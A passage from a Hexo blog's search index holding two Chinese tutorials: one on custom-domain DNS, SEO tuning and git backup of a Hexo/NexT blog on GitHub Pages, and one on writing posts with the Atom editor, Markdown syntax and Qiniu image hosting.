<h4 id="3）配置域名解析"><a href="#3）配置域名解析" class="headerlink" title="3）配置域名解析"></a><strong>3）配置域名解析</strong></h4><p>添加以下3条记录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@          A             192.30.252.153</div><div class="line">@          A             192.30.252.154</div><div class="line">www      CNAME           username.github.io</div></pre></td></tr></table></figure></p>
<p>设置好后可能需要等一段时间才能生效。</p>
<h3 id="0x08-SEO优化"><a href="#0x08-SEO优化" class="headerlink" title="0x08 SEO优化"></a><strong>0x08 SEO优化</strong></h3><p>为了能让 Google 能搜到 blog 中的内容，需要优化站点的 SEO（Search  Engine Optimization）。</p>
<h4 id="1）添加sitemap"><a href="#1）添加sitemap" class="headerlink" title="1）添加sitemap"></a><strong>1）添加sitemap</strong></h4><p>首先 执行 <code>npm install hexo-generator-sitemap --save</code> 安装 sitemap 生成插件，然后在站点配置文件添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">##sitemap</div><div class="line">sitemap:</div><div class="line">  path: sitemap.xml</div></pre></td></tr></table></figure></p>
<h4 id="2）添加-robots-txt"><a href="#2）添加-robots-txt" class="headerlink" title="2）添加 robots.txt"></a><strong>2）添加 robots.txt</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># hexo robots.txt</div><div class="line">User-agent: *</div><div class="line">Allow: /</div><div class="line">Allow: /archives/</div><div class="line">Allow: /categories/</div><div class="line">Allow: /about/</div><div class="line">Allow: /tags/</div><div class="line"></div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /js/</div><div class="line">Disallow: /css/</div><div class="line">Disallow: /fonts/</div><div class="line">Disallow: /vendors/</div><div class="line">Disallow: /fancybox/</div><div class="line"></div><div class="line">Sitemap: http://0x4c43.cn/sitemap.xml</div></pre></td></tr></table></figure>
<h4 id="3）验证-blog-网站"><a href="#3）验证-blog-网站" class="headerlink" title="3）验证 blog 网站"></a><strong>3）验证 blog 网站</strong></h4><p>进入 Google 搜索引擎入口，<code>添加属性 &gt; 备用方法 &gt; HTML 标记</code>，将 Google 的 html 标签，添加到 <code>/themes/next/layout/_partials/head.swig</code> 文件中，重新发布 blog，点击验证。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta name=&quot;google-site-verification&quot; content=&quot;-rILxxxxx7gbfxxxxx-E1VWxxxxxTcq6pxgs_xxxxx&quot; /&gt;</div></pre></td></tr></table></figure></p>
<h4 id="4）收录站点"><a href="#4）收录站点" class="headerlink" title="4）收录站点"></a><strong>4）收录站点</strong></h4><p>点击<code>网址 &gt; 抓取 &gt; 站点地图 &gt; 添加测试站点地图 &gt; 填写sitemap.xml &gt; 提交</code>。大概过一天之后便能通过Google搜索到。</p>
<h4 id="5）给出站链接添加-“nofollow”-标签"><a href="#5）给出站链接添加-“nofollow”-标签" class="headerlink" title="5）给出站链接添加 “nofollow” 标签"></a><strong>5）给出站链接添加 “nofollow” 标签</strong></h4><p>nofollow 标签是由谷歌领头创新的一个 “反垃圾链接” 的标签，并被百度、yahoo 等各大搜索引擎广泛支持，引用 nofollow 标签的目的是：用于指示搜索引擎不要追踪（即抓取）网页上的带有 nofollow 属性的任何出站链接，以减少垃圾链接的分散网站权重。</p>
<p>a．打开<code>/themes/next/layout/_partials/footer.swig</code>，将代码中的a标签加上 rel=”external nofollow”属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a class=&quot;theme-link&quot; href=&quot;https://hexo.io&quot; rel=&quot;external nofollow&quot;&gt;Hexo&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;a class=&quot;theme-link&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot; rel=&quot;external nofollow&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>b．打开<code>/themes/next/layout/_macro/sidebar.swig</code> 文件，将下面代码中的a标签加上 rel=”external nofollow” 属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;&#123;&#123; link &#125;&#125;&quot; title=&quot;&#123;&#123; name &#125;&#125;&quot; target=&quot;_blank&quot; rel=&quot;external nofollow&quot;&gt;</div><div class="line"></div><div class="line">&lt;a href=&quot;https://creativecommons.org/&#123;% if theme.creative_commons === &apos;zero&apos; %&#125;publicdomain/zero/1.0&#123;% else %&#125;licenses/&#123;&#123; theme.creative_commons &#125;&#125;/4.0&#123;% endif %&#125;/&quot; class=&quot;cc-opacity&quot; target=&quot;_blank&quot; rel=&quot;external nofollow&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="6）添加文章-keywords-和-description"><a href="#6）添加文章-keywords-和-description" class="headerlink" title="6）添加文章 keywords 和 description"></a><strong>6）添加文章 keywords 和 description</strong></h4><p>在<code>\scaffolds\post.md</code> 中添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keywords:</div><div class="line">categories:</div></pre></td></tr></table></figure></p>
<p>新建post的时候添加keywords，会自动转成 <code>&lt;meta name=&quot;keywords&quot; content=&quot;XXX&quot; /&gt;</code>。</p>
<h4 id="7）优化首页-title"><a href="#7）优化首页-title" class="headerlink" title="7）优化首页 title"></a><strong>7）优化首页 title</strong></h4><p>修改<code>\themes\next\layout\index.swig</code>文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125;  &#123;% endblock %&#125;</div><div class="line">改成</div><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125;  &#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="8）修改网站链接"><a href="#8）修改网站链接" class="headerlink" title="8）修改网站链接"></a><strong>8）修改网站链接</strong></h4><p>编辑站点配置文件，将 url 修改为网站域名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url: http://0x4c43.cn</div></pre></td></tr></table></figure></p>
<h4 id="9）修改文章链接形式"><a href="#9）修改文章链接形式" class="headerlink" title="9）修改文章链接形式"></a><strong>9）修改文章链接形式</strong></h4><p>默认文章链接形式为<code>domain/year/month/day/title</code>，以改成<code>domain/title</code> 的形式，修改站点配置文件中 permalink 字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">permalink: :title/</div></pre></td></tr></table></figure></p>
<h3 id="0x09-Blog备份与恢复"><a href="#0x09-Blog备份与恢复" class="headerlink" title="0x09 Blog备份与恢复"></a><strong>0x09 Blog备份与恢复</strong></h3><p>Hexo blog 发布后，在 github 仓库中只保存有生成的静态文件，而 blog 的源文件：主题和文章等只保存在本地。为了避免电脑出故障导致数据丢失带来的麻烦，可以将源文件备份到 github 上。</p>
<h4 id="1-备份"><a href="#1-备份" class="headerlink" title="1. 备份"></a><strong>1. 备份</strong></h4><p>1）修改.gitignore 文件<br>指定部分文件不备份。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">Thumbs.db</div><div class="line">db.json</div><div class="line">*.log</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">.deploy*/</div><div class="line">.deploy_git</div><div class="line">themes</div></pre></td></tr></table></figure></p>
<p>2）生成 git 仓库<br>在站点根目录下执行 <code>git init</code>。</p>
<p>3）添加远程仓库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote add origin https://github.com/0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>4）新建分支<br>在站点根目录下执行 <code>git checkout –b Hexo</code> 新建分支 Hexo 用于备份源文件。</p>
<p>5）添加到本地分支<br>将站点源文件提交到本地 Hexo 分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div></pre></td></tr></table></figure></p>
<p>6）push 到远程分支<br>执行 <code>git push origin Hexo:Hexo</code> 将本地 Hexo 分支推送到远程 Hexo 分支。</p>
<p>注：push 操作时出现错误及解决方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: unable to create directory for .git/logs/refs/remotes/origin/Hexo</div><div class="line">error: Cannot update the ref &apos;refs/remotes/origin/Hexo&apos;.</div><div class="line">solution:</div><div class="line">sudo chown -R username .</div></pre></td></tr></table></figure></p>
<p>7）成功备份<br>之后写文章之后都先备份，再发布。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div><div class="line">git push origin Hexo:Hexo</div><div class="line"></div><div class="line">hexo clean</div><div class="line">hexo d -g</div></pre></td></tr></table></figure></p>
<h4 id="2-恢复"><a href="#2-恢复" class="headerlink" title="2. 恢复"></a><strong>2. 恢复</strong></h4><p>当需要在另一台电脑上写 blog 时，可以通过以下方式恢复 Hexo 环境。<br>1）下载 Node.js 并安装<br>2）下载安装git<br>3）下载安装hexo<br>4）恢复源文件<br>通过 Git 克隆备份的 blog：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git@github.com:0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>5）切换到Hexo分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout  Hexo</div></pre></td></tr></table></figure></p>
<p>6）安装 git 部署插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git</div></pre></td></tr></table></figure></p>
<p>之后就可以更新 blog 了。</p>
<h3 id="0x09-备份Next主题"><a href="#0x09-备份Next主题" class="headerlink" title="0x09 备份Next主题"></a><strong>0x09 备份Next主题</strong></h3><h4 id="1）将主题-fork-到自己仓库"><a href="#1）将主题-fork-到自己仓库" class="headerlink" title="1）将主题 fork 到自己仓库"></a><strong>1）将主题 fork 到自己仓库</strong></h4><h4 id="2）获取主题"><a href="#2）获取主题" class="headerlink" title="2）获取主题"></a><strong>2）获取主题</strong></h4><p>执行以下命令下载主题到本地。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git submolule add git@github.com:0x4C43/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h4 id="3）push-到远程分支"><a href="#3）push-到远程分支" class="headerlink" title="3）push 到远程分支"></a><strong>3）push 到远程分支</strong></h4><p>将修改好主题后 push 到远程分支。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git commit -am &quot;update theme&quot;</div><div class="line">git push origin</div></pre></td></tr></table></figure></p>
<h4 id="4）恢复主题"><a href="#4）恢复主题" class="headerlink" title="4）恢复主题"></a><strong>4）恢复主题</strong></h4><p>在需要恢复主题时，执行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule init</div><div class="line">git submodule update</div></pre></td></tr></table></figure></p>
<hr>
<p>Reference:<br>[1] Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a><br>[2] NexT 主题官网：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a><br>[3] Hexo-GitHub Page 博客绑定域名：<a href="http://ccxxmd.me/2017/03/04/Blog_domainname/" target="_blank" rel="external">http://ccxxmd.me/2017/03/04/Blog_domainname/</a><br>[4] 推荐网易云跟帖：<a href="https://blog.vadxq.com/dstogentie/" target="_blank" rel="external">https://blog.vadxq.com/dstogentie/</a><br>[5] Hexo Next 主题 SEO 优化：<a href="http://fanjun.im/2016/09/hexo_next_seo.html" target="_blank" rel="external">http://fanjun.im/2016/09/hexo_next_seo.html</a><br>[6] Hexo 博客备份：<a href="http://nhsensation.xyz/2016/03/14/move-blog/" target="_blank" rel="external">http://nhsensation.xyz/2016/03/14/move-blog/</a><br>[7] 备份 Hexo 源文件至 GitHub：<a href="http://www.leyar.me/backup-your-blog-to-github/" target="_blank" rel="external">http://www.leyar.me/backup-your-blog-to-github/</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Next </tag>
            
            <tag> Github </tag>
            
            <tag> 域名绑定 </tag>
            
            <tag> SEO优化 </tag>
            
            <tag> Blog备份 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Atom+Markdown写文章]]></title>
      <url>/%E4%BD%BF%E7%94%A8Atom+Markdown%E5%86%99%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<h3 id="0x01-Atom"><a href="#0x01-Atom" class="headerlink" title="0x01 Atom"></a><strong>0x01 Atom</strong></h3><p>Atom 是 Github 推出的一个开源跨平台文本编辑器。具有简洁和直观的图形用户界面，支持 CSS、HTML、JavaScript 等网页编程语言。 并且支持宏和自动分屏等功能，还集成了文件管理器。同时，Atom 也支持 Markdown 语法，所以可以很方便地写 Hexo blog。</p>
<p>可以在官网下载<a href="https://atom.io/" target="_blank" rel="external">Atom</a>。</p>
<h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a><strong>常用快捷键</strong></h4><p>在File/Settings/Keybindiigns下定义了大量快捷键，常用快捷键如下:</p>
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Crtl+Shift+M</td>
<td style="text-align:left">开启Markdown实时预览</td>
</tr>
<tr>
<td style="text-align:left">Command+Shift+P</td>
<td style="text-align:left">打开命令窗口，可以运行各种菜单功能</td>
</tr>
<tr>
<td style="text-align:left">Command + T</td>
<td style="text-align:left">多文件切换</td>
</tr>
<tr>
<td style="text-align:left">Command + F</td>
<td style="text-align:left">文件内查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + Shift + F</td>
<td style="text-align:left">多文件查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + [</td>
<td style="text-align:left">对选中内容向左缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + ]</td>
<td style="text-align:left">对选中内容向右缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + \</td>
<td style="text-align:left">显示或隐藏目录树</td>
</tr>
<tr>
<td style="text-align:left">Crtl + m</td>
<td style="text-align:left">括号之间/HTML tag之间等跳转</td>
</tr>
</tbody>
</table>
<h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a><strong>插件</strong></h4><p>Atom 支持插件扩展，下面列举一些实用的插件。点击File/Settings/Install，输入相应的插件名称进行安装。</p>
<ul>
<li><p>增强预览(markdown-preview-plus)<br>需要关闭系统自带的markdown-preview，Ctrl+Shift+M 打开预览窗口。</p>
</li>
<li><p>实时滚动预览(markdown-scroll-sync)<br>预览窗口将跟随编辑界面的鼠标移动，可实时查看效果。</p>
</li>
<li><p>格式化代码(atom-beautify)   </p>
</li>
<li><p>表格编辑(markdown-table-editor)<br>输入 table，然后按 Tab 键将自动输出表格样式。</p>
</li>
<li><p>导出pdf/png/jpeg/html(markdown-themeable-pdf)<br>在文章编辑区域单击右键，Markdown to PDF。若要导出其它格式，在File/Settings/packeages/markdown-themeable-pdf/Settings 中进行设置。</p>
</li>
<li><p>博客支持(markdown-Writer)</p>
</li>
</ul>
<h3 id="0x02-Markdown-常用语法"><a href="#0x02-Markdown-常用语法" class="headerlink" title="0x02 Markdown 常用语法"></a><strong>0x02 Markdown 常用语法</strong></h3><blockquote>
<p>Markdown 是一种轻量级标记语言，它允许人们 “易读易写的纯文本格式编写文档，然后转换成有效的XHTML(或者HTML)文档”。Markdown 最重要的设计是可读性，能直接在字面上的被阅读，而不用被一些格式化指令标记 (如 RTF 与 HTML)。 因此，它是现行电子邮件标记格式的惯例，虽然它也借鉴了很多早期的标记语言，如：setext、Texile、reStructuredText。 — wikipedia</p>
</blockquote>
<h4 id="换行"><a href="#换行" class="headerlink" title="换行"></a><strong>换行</strong></h4><p>在行尾输入两个以上的空格然后回车。</p>
<h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h4><p>在标题内容前输入特定数量的’#’来实现对应级别的HTML样式的标题(HTML提供六级标题)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">## 这是 H1</div><div class="line">### 这是 H2</div><div class="line">###### 这是 H6</div></pre></td></tr></table></figure></p>
<h4 id="区块引用"><a href="#区块引用" class="headerlink" title="区块引用"></a><strong>区块引用</strong></h4><p>在引用内容的每行或者是段首加 ‘&gt;’，引用块中可以根据层次加上不同数量的 ‘&gt;’进行嵌套引用。 同时，引用区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; #### This is a blockquote with paragraphs.</div></pre></td></tr></table></figure></p>
<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong>列表</strong></h4><p>Markdown 支持有序列表和无序列表。<br>无序列表使用 ‘*‘、’+’ 或是 ‘-‘ 作为列表标记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-   Red   </div><div class="line">-   Green   </div><div class="line">-   Blue</div></pre></td></tr></table></figure></p>
<p>有序列表则使用数字接着一个英文句点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  Bird</div><div class="line">2.  McHale</div><div class="line">3.  Parish</div></pre></td></tr></table></figure></p>
<p>当文章内容刚好行首出现数字-句点-空白时，不希望解析为有序列表，可以在句点前面加上反斜杠。</p>
<h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a><strong>代码块</strong></h4><p>在代码块的每行前面加 4 个空格或是 1 个制表符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这是一个普通段落：</div><div class="line">    这是一个代码区块。</div></pre></td></tr></table></figure></p>
<p>当代码量较大时可以用三个反引号包围 ```。在代码块中添加一个可选的语言标识符,可以根据语法高亮显示，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;&apos;&apos; C</div><div class="line">void main() &#123;</div><div class="line">  printf (&quot;Hello World!&quot;);</div><div class="line">&#125;</div><div class="line">&apos;&apos;&apos;</div></pre></td></tr></table></figure></p>
<p>如果要标记一小段行内代码，可以用反引号``，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Use the `printf()` function.</div></pre></td></tr></table></figure></p>
<h4 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a><strong>分割线</strong></h4><p>在一行中用三个以上的 ‘*‘ 或 ‘-‘ 来建立个分割线，在符号中间可以插入空格。下面是几种正确的写法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">* * *</div><div class="line">***</div><div class="line">*****</div><div class="line">- - -</div><div class="line">---------------------------------------</div></pre></td></tr></table></figure></p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a><strong>链接</strong></h4><p>链接文字用 [方括号] 标记，方块括号后面圆括号中为网址链接（也可以是相对路径），网址后面双引号中的内容为链接的 title，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">This is [an example](http://example.com/ &quot;Title&quot;) inline link.</div><div class="line">[This link](http://example.net/) has no title attribute.</div></pre></td></tr></table></figure></p>
<h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a><strong>强调</strong></h4><p>Markdown 使用 ‘*‘ 或 ‘_‘ 作为标记强调字词的符号。首尾各一个为斜体，首尾各两个为加粗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*single asterisks*</div><div class="line">_single underscores_</div><div class="line">**double asterisks**</div><div class="line">__double underscores__</div></pre></td></tr></table></figure></p>
<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a><strong>图片</strong></h4><p>Markdown 使用与链接相似的语法来标记图片，方括号内为图片的替代文字，圆括号内为图片地址，同样也可以加上 title。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![Alt text](/path/to/img.jpg &quot;Title&quot;)</div></pre></td></tr></table></figure></p>
<h4 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a><strong>自动链接</strong></h4><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;http://example.com/&gt;</div></pre></td></tr></table></figure></p>
<h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a><strong>表格</strong></h4><p>在安装 markdown-table-editor 插件之后可以很方便的编辑表格，输入table,按 Tab 键就会出现表格样式。注意在表格之前要空一行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">| Header One | Header Two |</div><div class="line">|:---------- |:---------- |</div><div class="line">| Item One   | Item Two   |</div></pre></td></tr></table></figure></p>
<p>默认标题栏居中对齐，内容居左对齐。<br>-: 表示内容和标题栏靠右对齐，:- 表示内容和标题栏靠左对齐，:-: 表示内容和标题栏居中对齐。</p>
<h3 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a><strong>0x03 插入图片</strong></h3><p>用 Markdown 写文章有个麻烦的地方就是不能直接插图片，通常需要将图片放在本地或者云上，然后在文章中通过图片链接（相对地址或网址）来插图片。为了节省 Blog 的空间，将图片上传到<a href="https://www.qiniu.com/" target="_blank" rel="external">七牛云</a>上。   </p>
<h4 id="1）注册账号并登录"><a href="#1）注册账号并登录" class="headerlink" title="1）注册账号并登录"></a><strong>1）注册账号并登录</strong></h4><h4 id="2）新建-buket"><a href="#2）新建-buket" class="headerlink" title="2）新建 buket"></a><strong>2）新建 buket</strong></h4><p>对象存储 &gt; 新建存储空间，输入相关信息。   </p>
<h4 id="3）极简图床-Chrome-插件"><a href="#3）极简图床-Chrome-插件" class="headerlink" title="3）极简图床 Chrome 插件"></a><strong>3）极简图床 Chrome 插件</strong></h4><p>使用极简图床可以绑定七牛云存储空间，然后可以通过拖拽的方式上传图片到云上。绑定七牛云需要空间名称、AK、SK 和域名。</p>
<div align="center"><br>  <img src="http://ooyovxue7.bkt.clouddn.com/17-4-26/26825806-file_1493208795361_1da.png?imageView/3/w/300/h/300/q/100"><br></div>

<h4 id="4）插入图片"><a href="#4）插入图片" class="headerlink" title="4）插入图片"></a><strong>4）插入图片</strong></h4><p>在文章中使用以下语法插入图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">![](image_link)</div><div class="line"></div><div class="line">&lt;div align=center&gt;  # 图片居中</div><div class="line">  &lt;img src= &quot;url&quot;/&gt;</div><div class="line">&lt;/div &gt;</div><div class="line"></div><div class="line">![](image_link?imageView/3/w/400/h/400/q/100)   # 七牛云图片缩放，w：刻度，h：高度，q：图片质量</div></pre></td></tr></table></figure></p>
<h3 id="0x04-文章发布"><a href="#0x04-文章发布" class="headerlink" title="0x04 文章发布"></a><strong>0x04 文章发布</strong></h3><p>在搭建好 Hexo Blog 之后，可以通过以下步骤新建并发布一篇新的文章。</p>
<h4 id="1）创建文章"><a href="#1）创建文章" class="headerlink" title="1）创建文章"></a><strong>1）创建文章</strong></h4><p>执行下列命令来创建一篇新文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo new post &lt;title&gt;</div></pre></td></tr></table></figure></p>
<h4 id="2）撰写文章"><a href="#2）撰写文章" class="headerlink" title="2）撰写文章"></a><strong>2）撰写文章</strong></h4><p>使用 Atom 和 Markdown 语法写文章内容。</p>
<h4 id="3）发布文章"><a href="#3）发布文章" class="headerlink" title="3）发布文章"></a><strong>3）发布文章</strong></h4><p>首先需要生成静态文件，然后部署到Hexo中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean  # 清除缓存文件 (db.json) 和已生成的静态文件 (public)</div><div class="line">hexo g      # 生成静态文件</div><div class="line">hexo d      # 部署网站</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="http://www.markdown.cn/" target="_blank" rel="external">Markdown 官网语法说明</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Atom </tag>
            
            <tag> Markdown </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
